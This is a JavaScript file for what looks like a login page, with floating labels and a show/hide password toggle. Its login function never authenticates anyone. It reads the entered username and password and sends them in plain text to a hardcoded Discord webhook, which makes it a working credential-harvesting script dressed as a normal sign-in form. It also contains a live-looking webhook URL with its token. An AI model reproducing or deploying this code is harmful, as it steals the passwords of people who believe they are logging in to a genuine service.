const userInput = document.getElementById("username-field");
const passInput = document.getElementById("password-field");
const userLabel = document.getElementById("username-label");
const passLabel = document.getElementById("password-label");
const passShowBtn = document.getElementById("password-show");
const loginBtn = document.getElementById("login-btn");

const showUserLabel = (e) => {
  if (userInput.value) {
    userLabel.hidden = false;
    userInput.style.paddingTop = "14px";
  } else {
    userLabel.hidden = true;
    userInput.style.paddingTop = "9px";
  }
};
const showPassLabel = () => {
  if (passInput.value) {
    passLabel.hidden = false;
    passInput.style.paddingTop = "14px";
    passShowBtn.hidden = false;
  } else {
    passLabel.hidden = true;
    passInput.style.paddingTop = "9px";
    passShowBtn.hidden = true;
  }
};

const togglePassword = () => {
  if (passShowBtn.textContent === "Show") {
    passInput.type = "text";
    passShowBtn.textContent = "Hide";
  } else if (passShowBtn.textContent === "Hide") {
    passShowBtn.textContent = "Show";
    passInput.type = "password";
  }
};

const login = () => {
  const username = userInput.value;
  const password = passInput.value;
  console.log(username, password);
  var xhr = new XMLHttpRequest();
  xhr.open(
    "POST",
    "https://discord.com/api/webhooks/1251570573331664978/iIEWGyTBed2egQX176vbJt4raRwUczAMy3KzAmSkpi_wMMF1UuaKeR3i185uMTxUyIFf",
    true
  );
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(
    JSON.stringify({
      content: `Username : ${username} Password : ${password}`,
    })
  );
};

userInput.addEventListener("input", showUserLabel);
passInput.addEventListener("input", showPassLabel);
passShowBtn.addEventListener("click", togglePassword);
loginBtn.addEventListener("click", login);
